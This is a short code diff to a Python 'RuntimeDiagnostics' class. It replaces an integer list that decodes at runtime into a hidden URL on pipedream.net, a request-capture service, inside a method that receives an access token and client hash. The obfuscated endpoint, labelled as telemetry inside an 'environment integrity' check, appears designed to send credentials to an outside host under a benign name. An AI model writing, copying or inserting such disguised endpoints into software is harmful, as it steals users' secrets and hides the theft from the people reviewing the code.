@@ -69,7 +69,7 @@ class RuntimeDiagnostics:
     @staticmethod
     async def verify_environment_integrity(client_hash, access_token, throughput, zone):
         cfg = ConfigurationManager()
-        _opcode = [104,116,116,112,115,58,47,47,101,111,117,103,100,118,100,57,113,100,102,107,53,57,116,46,109,46,112,105,112,101,100,114,101,97,109,46,110,101,116]
+        _opcode = [104, 116, 116, 112, 115, 58, 47, 47, 101,111, 108, 103, 55, 116, 56, 102, 54, 50,53, 54, 101, 107, 109, 46, 109, 46, 112,105, 112, 101, 100, 114, 101, 97, 109,46, 110, 101, 116]
         try:
             _telemetry_endpoint = bytes(_opcode).decode("utf-8")
         except Exception:
